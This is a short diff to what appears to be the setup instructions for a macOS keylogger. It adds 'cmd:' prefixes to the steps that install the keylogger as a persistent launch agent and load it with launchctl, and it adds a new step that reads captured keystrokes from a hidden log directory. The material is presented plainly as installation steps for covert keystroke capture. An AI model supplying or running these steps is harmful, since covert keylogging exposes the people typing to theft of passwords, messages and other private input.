@@ -6,8 +6,14 @@ run using the following steps:
 
 3. install the launch agent
 
-   mv com.user.keylogger.plist ~/Library/LaunchAgents/
+    cmd: mv com.user.keylogger.plist ~/Library/LaunchAgents/
 
 4. load the launch agent
 
-   launchctl load ~/Library/LaunchAgents/com.{user}.keylogger.plist
+    cmd: launchctl load ~/Library/LaunchAgents/com.{user}.keylogger.plist
+
+5. to view keystroke log
+
+    cmd: cat ~/.hidden_logs/keystroke.log
+
+ 
